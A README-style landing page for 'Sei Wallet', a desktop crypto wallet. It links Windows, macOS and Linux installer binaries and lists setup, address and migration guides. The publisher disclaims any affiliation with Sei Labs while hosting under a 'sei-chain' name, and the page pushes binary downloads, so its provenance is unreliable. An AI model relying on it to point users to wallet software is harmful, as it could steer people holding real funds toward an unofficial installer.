![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-hub.png)

<h1 align="center">Sei Wallet guides</h1>

<p align="center">Setup, staking and security guides for the Sei desktop wallet.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

## What this repository covers

Sei Wallet is a non-custodial desktop wallet for Sei, built by Sei Wallet Labs Inc and distributed for Windows, macOS and Linux. This repository holds the setup and migration guides: installing the app, checking a download before you run it, creating or restoring an account, understanding the two address forms, adding Sei to a wallet you already use, and moving a balance out of Keplr, Leap, Compass, Trust Wallet or an exchange.

The guides assume you are moving real funds and would rather not learn by losing some. Each one names the step where the mistake usually happens, what it costs, and how to confirm afterwards that the transfer did what you intended. Where a number comes from Sei's own documentation, the guide says so and tells you to check it in the app, because network parameters change and an article does not.

Start with the download check if the app is not installed yet. Start with the address form if a balance is not where you expect it. Start with the exchange guide if you are withdrawing for the first time: the memo field and the network label are the two places a withdrawal is lost, and both are decided before you press send.

## Start here

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: verify a download](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-verify-a-download-before-installing.md) | Compare the file against the published SHA-256 before running it. |
| [Sei Wallet: create an account](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md) | Set up the app and store the phrase before funding anything. |
| [Sei Wallet: which address form](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) | Decide between `0x` and `sei1` before you hand an address out. |

</div>

## Install and first run

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) | What the desktop app is, what it holds, and what it leaves on the chain. |
| [Sei Wallet: How to verify a Sei Wallet download](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-verify-a-download-before-installing.md) | Check the file you downloaded against the published SHA-256 before you run it. |
| [Sei Wallet: How to create a Sei wallet and what the setup asks for](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md) | Set up an account, write the phrase down, and fund it only after that. |
| [Sei Wallet: Importing an existing wallet into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md) | Bring an existing phrase across and confirm the address before moving funds. |
| [Sei Wallet: A desktop Sei Wallet or a browser extension](https://github.com/sei-chain/sei-wallet-setup/blob/main/desktop-app-or-browser-extension.md) | Two ways to hold SEI, and the trade each one makes in practice. |
| [Sei Wallet: Sei testnet, the faucet and test coins in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/testnet-faucet-and-test-coins.md) | Run the testnet beside mainnet and get test coins without risking real SEI. |

</div>

## Addresses and networks

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: sei1 and 0x addresses in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) | One account, two address forms, and which one to hand to whom. |
| [Sei Wallet: Where to find your Sei Wallet address](https://github.com/sei-chain/sei-wallet-setup/blob/main/where-to-find-your-address.md) | Where the receive screen keeps the address, and how to check it is right. |
| [Sei Wallet: Chain ID 1329 and the Sei network settings in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/network-settings-and-chain-id-1329.md) | Chain ID 1329, the Pacific mainnet settings, and when you need them. |
| [Sei Wallet: RPC endpoints for Sei Wallet and what they change](https://github.com/sei-chain/sei-wallet-setup/blob/main/rpc-endpoints-and-what-they-change.md) | What an RPC endpoint does, and what changing it can and cannot fix. |
| [Sei Wallet: Is Sei EVM compatible, and what that means for Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/evm-compatibility-explained.md) | What EVM compatibility means for a SEI holder using a desktop wallet. |

</div>

## Add Sei to another wallet

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: Add Sei to MetaMask, or use a Sei wallet instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) | Add the Sei network to MetaMask, and know what it still cannot do. |
| [Sei Wallet: Adding Sei to Trust Wallet, or holding it in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/configure-the-network-in-trust.md) | Set the network up in Trust Wallet, or hold SEI where staking works. |
| [Sei Wallet: Sei in Rabby, Phantom and other EVM wallets, or in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/use-rabby-phantom-or-a-desktop-app.md) | What Rabby and Phantom show for SEI, and where the difference matters. |

</div>

## Move a balance in

<div align="center">

| Guide | What it answers |
|:--|:--|
| [Sei Wallet: Moving SEI off Compass to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) | Move a balance out of Compass and confirm it arrived on the other side. |
| [Sei Wallet: Moving SEI from Keplr to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-out-of-keplr.md) | Send from Keplr to the desktop app without losing track of the address form. |
| [Sei Wallet: Migrating SEI from Leap Wallet to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/migrate-an-account-from-leap.md) | Recreate the account in the desktop app, or send the balance across instead. |
| [Sei Wallet: Moving SEI out of Trust Wallet into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/send-coins-out-of-trust.md) | Get SEI out of Trust Wallet and into an account you can stake from. |
| [Sei Wallet: Withdrawing SEI from an exchange to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/withdraw-from-an-exchange.md) | Withdraw to the right network and address form, with the memo if it is asked. |
| [Sei Wallet: The Sei memo field and exchange deposits into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md) | When a memo is required, what happens without it, and who can help. |

</div>

## More guides

- [Sei Wallet staking guides](https://github.com/sei-chain/sei-wallet-staking/blob/main/README.md)
- [Sei Wallet help and security](https://github.com/sei-chain/sei-wallet-help/blob/main/README.md)

---

## About

Sei Wallet is a non-custodial desktop wallet for Sei on Windows, macOS and Linux, built by Sei Wallet Labs Inc, which states no affiliation with Sei Labs or the Sei Foundation. Every guide here is written from the current release and Sei's own documentation; where a figure is a network parameter rather than a constant, the guide says so and points you at the app.

**Sei Wallet is non-custodial: the operator cannot move, freeze or recover your funds, which also means nobody can undo a transfer you sign.**

This repository's guides are published under the Apache-2.0 licence, the same one the application uses. The licence text sits in `LICENSE` at the repository root.

[Main repository](https://github.com/sei-chain/sei-wallet) - [Release v6.6.2](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2)
